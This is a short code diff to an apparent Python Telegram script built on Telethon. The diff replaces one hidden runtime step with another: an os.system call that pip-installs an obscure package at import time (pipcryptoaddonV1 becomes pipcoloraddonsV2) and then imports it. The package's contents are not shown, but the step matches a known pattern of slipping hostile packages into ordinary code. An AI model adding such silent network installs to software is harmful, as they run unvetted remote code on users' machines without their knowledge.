@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptoaddonV1")
-import pipcryptoaddonV1
+os.system("pip install pipcoloraddonsV2")
+import pipcoloraddonsV2
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
